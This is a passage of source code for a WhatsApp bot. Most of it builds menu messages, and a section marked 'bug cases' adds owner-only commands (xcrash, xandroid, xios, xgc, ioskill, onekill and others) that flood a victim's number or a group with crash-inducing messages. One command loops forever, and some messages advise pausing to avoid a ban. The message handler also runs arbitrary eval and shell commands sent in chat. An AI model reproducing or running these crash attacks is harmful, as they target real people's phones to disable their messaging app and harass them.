                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'othermenu': {
let xmenu_oh = `
╭──❍「 *GREETING* 」❍
├ *Hi 👋*
├ *${m.pushName}* 
├ *${xeonytimewisher} 😄* 
╰─┬────❍ ${readmore}
╭─┴❍「 *GUIDE* 」❍
├ *🅞 = For Owner* 
├ *🅕 = For Free User*
├ *🅟 = For Premium User*
╰─┬────❍
╭─┴❍「 *Other* 」❍
│${setv} ${prefix}update 🅕
│${setv} ${prefix}ping 🅕
│${setv} ${prefix}menu 🅕
│${setv} ${prefix}myip 🅕
│${setv} ${prefix}repo 🅕
│${setv} ${prefix}reportbug 🅕
│${setv} ${prefix}idgroup 🅕
│${setv} ${prefix}owner 🅕
│${setv} ${prefix}rentbot 🅕
│${setv} ${prefix}donate 🅕
│${setv} ${prefix}runtime 🅕
│${setv} ${prefix}confess 🅕
│${setv} ${prefix}react 🅕
│${setv} ${prefix}q 🅕
│${setv} ${prefix}inspect 🅕
│${setv} ${prefix}tagme 🅕
╰──────❍`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    XeonBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    XeonBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    XeonBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    XeonBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	XeonBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	XeonBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"قـائـمـة الاوامـر ⚡",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break

 //bug cases
 case 'xcrash':{
if (!XeonTheCreator) return
 if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
 victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "100"
for (let i = 0; i < amount; i++) {
XeonyCrashy(pushname,victim)
await sleep(3000)
}
replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
}
break
case "xandroid": {
  if (!XeonTheCreator) return
  if (!text) return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return replygcxeon("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "916909137213") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  replygcxeon("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendVariousMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "xios": {
  if (!XeonTheCreator) return
  if (!text) return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return replygcxeon("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "916909137213") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  replygcxeon("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMultiplePaymentInvites(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "xios2":
  {
	if (!XeonTheCreator) return
    if (!isBot) {
      return replygcxeon("*This feature is for the bot only!*");
    }
    if (!text){
      return replygcxeon(`Example usage: ${prefix + command} 5`)
      }
    if (isNaN(parseInt(text))) {
      return replygcxeon("Amount must be a number");
    }
    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
    replygcxeon("please wait, " + command + " bug is in process..");
    await sleep(1500); // Adjusted sleep time for clarity
    sendMultiplePaymentInvites(from, encodedValue);
    await sleep(2500); // Adjusted sleep time for clarity
    sendReaction('✅');
  }
  break;
  case "xandroid2":
  {
	if (!XeonTheCreator) return
    if (!isBot) {
      return replygcxeon("*This feature is for the bot only!*");
    }
    if (!text){
      return replygcxeon(`Example usage: ${prefix + command} 5`)
      }
    if (isNaN(parseInt(text))) {
      return replygcxeon("Amount must be a number");
    }
    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
    replygcxeon("please wait, " + command + " bug is in process..");
    await sleep(1500); // Adjusted sleep time for clarity
    sendVariousMessages(from, encodedValue);
    await sleep(2500); // Adjusted sleep time for clarity
    sendReaction('✅');
  }
  break;
  case "xgc":
  {
    if (!XeonTheCreator) return
    if (!text) {
      return replygcxeon("*HOW TO SEND BUG TO GROUP*\n\n" + (prefix + command) + " https://chat.whatsapp.com/xxxx\n\n_*Note:*_ If you want to send a large number of bugs, please type as follows\n\nEx: ." + command + " linkgc amount\n\nExample:\n." + command + " https://chat.whatsapp.com/xxxx 10");
    }
    replygcxeon("please wait, " + command + " bug is in process..");
    if (!text.split(" ")[0].includes("whatsapp.com")) {
      return replygcxeon("Link Invalid!");
    }
    let groupLink = text.split(" ")[0].split("https://chat.whatsapp.com/")[1];
    try {
      let bugAmount = text.split(" ")[1] ? text.split(" ")[1] : '1';
      let groupTarget = await XeonBotInc.groupAcceptInvite(groupLink);
      await sleep(2000); // Adjusted sleep time for clarity
      sendViewOnceMessages(groupTarget, bugAmount);
      await sleep(2500); // Adjusted sleep time for clarity
      replygcxeon("*DONE✅ BUG HAS BEEN SENT TO THE GROUP!.*");
      XeonBotInc.groupLeave(groupTarget);
    } catch (error) {
      replygcxeon(util.format(error));
    }
  }
  break;
  case "🙂":
  {
	if (!XeonTheCreator) return
    if (!isBot) {
      return replygcxeon("*This feature is for the bot only!*");
    }
    if (!text){
      return replygcxeon(`Example usage: ${prefix + command} 5`)
      }
    if (isNaN(parseInt(text))) {
      return replygcxeon("Amount must be a number");
    }
    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
    replygcxeon("please wait, " + command + " bug is in process..");
    await sleep(1500); // Adjusted sleep time for clarity
    sendViewOnceMessages(from, encodedValue);
    await sleep(2500); // Adjusted sleep time for clarity
    sendReaction('✅');
  }
  break;
  case "systemuicrash": {
  if (!XeonTheCreator) return
  if (!text) return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return replygcxeon("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "916909137213") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  replygcxeon("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "xsysui": {
  if (!XeonTheCreator) return
  if (!text) return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return replygcxeon("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "916909137213") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  replygcxeon("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendRepeatedMessages2(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case 'ioskill': case 'iosx': {
            	if (!XeonTheCreator) return
let xeonyvictim = q.replace(/[^0-9]/g, "")
if (xeonyvictim.startsWith('0')) return replygcxeon(`Example : .${command} 916909137213`)
await replygcxeon(`In process....`)
let target = xeonyvictim + '@s.whatsapp.net'
  for (;;) {
    await aipong(target)
    await sleep(1200)
  }
}
break
case 'onekill': case 'oneclickall': case 'xsamsung': case 'xwaweb': case 'doublekill': case '💀': case 'triplekill': {
if (!XeonTheCreator) return
if (!q) return replygcxeon(`Usage .${command} 916909137213`)
let xeonyvictim = q.replace(/[^0-9]/g, "")
if (xeonyvictim.startsWith('0')) return replygcxeon(`Example : .${command} 916909137213`)
let target = xeonyvictim + '@s.whatsapp.net'
await replygcxeon(`In process....`)
for (let j = 0; j < 1; j++) {
await listxeonfck(target, oneclickxeon)
await locationxeony(target, force)
await xeonkillpic(target, oneclickxeon)
await locationxeony(target, force)
await blackening(target, force2)
await locationxeony(target, force)
}
await replygcxeon(`Successfully Send Bug to ${xeonyvictim} Using ${command}. ✅`)
}
break

			default:
			if (budy.startsWith('>')) {
				if (!XeonTheCreator) return
				try {
					let evaled = await eval(budy.slice(2))
					if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
					await replygcxeon(evaled)
				} catch (err) {
					await replygcxeon(String(err))
				}
			}
			if (budy.startsWith('<')) {
				if (!XeonTheCreator) return
				try {
					let evaled = await eval(`(async () => { ${budy.slice(2)} })()`)
					if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
					await replygcxeon(evaled)
				} catch (err) {
					await replygcxeon(String(err))
				}
			}
			if (budy.startsWith('$')) {
				if (!XeonTheCreator) return
				if (!text) return
				exec(budy.slice(2), (err, stdout) => {
					if (err) return replygcxeon(`${err}`)
					if (stdout) return replygcxeon(stdout)
				})
			}
			if (m.message && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.database
if (!(budy.toLowerCase() in msgs)) return
XeonBotInc.copyNForward(m.chat, msgs[budy.toLowerCase()], true, {quoted: m})
}
		}
	} catch (err) {
		console.log(util.format(err))
        let e = String(err)
XeonBotInc.sendMessage("916909137213@s.whatsapp.net", { text: "🌹 Hello developer, there seems to be an error, please fix it " + util.format(e), 
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}})
	}
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
});
